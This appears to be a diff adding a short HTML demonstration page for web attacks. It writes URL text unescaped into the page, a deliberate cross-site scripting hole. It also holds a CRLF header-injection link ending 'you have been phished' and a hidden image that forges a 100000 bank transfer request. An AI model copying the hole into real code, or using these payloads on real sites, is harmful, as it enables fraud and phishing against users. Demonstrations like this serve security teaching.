@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+
+<html>
+
+
+<head>
+
+  <link rel="stylesheet" href="style.css">
+
+  <script src="script.js"></script>
+
+</head>
+
+<script>
+
+    document.write("<form><select>");
+
+
+    document.write("<option value=1>" +
+    decodeURIComponent(document.location.href.substring(document.location.href.indexOf("default=") + 8)) + "</option>");
+
+
+    document.write("<option value=2> French </option>");
+
+    document.write("<option value=2> English </option>");
+
+    document.write("</select> </form>");
+
+    document.writeln("<a href='" + document.location.href + "#default=French%0d%0aContent- Length:%200%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2041%0d%0aHello, you have been phished' target=blank> Click here to see the demo in action</a>");
+
+
+
+</script>
+
+<body>
+
+<h1>Hello Koen!</h1>
+
+<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">
+</body>
+
+
+</html>
